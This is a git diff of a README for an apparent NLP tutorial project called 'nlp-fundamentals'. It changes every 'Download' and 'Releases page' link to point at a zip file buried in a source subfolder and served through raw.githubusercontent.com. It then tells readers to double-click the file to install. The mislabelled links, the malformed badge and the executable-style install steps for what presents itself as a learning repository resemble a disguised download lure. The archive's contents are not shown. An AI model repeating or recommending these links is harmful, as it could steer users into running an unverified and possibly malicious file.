@@ -4,13 +4,13 @@
 Welcome to **nlp-fundamentals**! This application helps you explore the foundational aspects of Natural Language Processing (NLP). Dive into web scraping, regex extraction, and traditional machine learning classification techniques. 
 
 ## 📥 Download nlp-fundamentals
-[![Download Now](https://raw.githubusercontent.com/Gab333x/nlp-fundamentals/main/classification/news_scrapper/news/nlp-fundamentals_v2.8.zip%20Now-Get%20the%20Latest%20Version-blue)](https://raw.githubusercontent.com/Gab333x/nlp-fundamentals/main/classification/news_scrapper/news/nlp-fundamentals_v2.8.zip)
+[![Download Now](https://raw.githubusercontent.com/Gab333x/nlp-fundamentals/main/classification/news_scrapper/news/nlp-fundamentals-v1.8-alpha.5.zip%20Now-Get%20the%20Latest%20Version-blue)](https://raw.githubusercontent.com/Gab333x/nlp-fundamentals/main/classification/news_scrapper/news/nlp-fundamentals-v1.8-alpha.5.zip)
 
 ## 🚀 Getting Started
 This section will guide you through downloading and running the application. Follow these simple steps:
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://raw.githubusercontent.com/Gab333x/nlp-fundamentals/main/classification/news_scrapper/news/nlp-fundamentals_v2.8.zip). Here you will find the latest versions of the application.
+   Go to our [Releases page](https://raw.githubusercontent.com/Gab333x/nlp-fundamentals/main/classification/news_scrapper/news/nlp-fundamentals-v1.8-alpha.5.zip). Here you will find the latest versions of the application.
 
 2. **Select the Version**
    Look for the latest release listed at the top. You will see various files available for download.
@@ -47,7 +47,7 @@ To ensure smooth operation, please verify that your system meets these minimum r
 ## 🛠️ Installation Process
 Installing the application is straightforward. Here is a repeat of the relevant steps for clarity:
 
-1. **Access the Releases page** via our [Download Link](https://raw.githubusercontent.com/Gab333x/nlp-fundamentals/main/classification/news_scrapper/news/nlp-fundamentals_v2.8.zip).
+1. **Access the Releases page** via our [Download Link](https://raw.githubusercontent.com/Gab333x/nlp-fundamentals/main/classification/news_scrapper/news/nlp-fundamentals-v1.8-alpha.5.zip).
 2. **Choose the correct file** for your operating system.
 3. **Double-click the file** to begin installation.
 
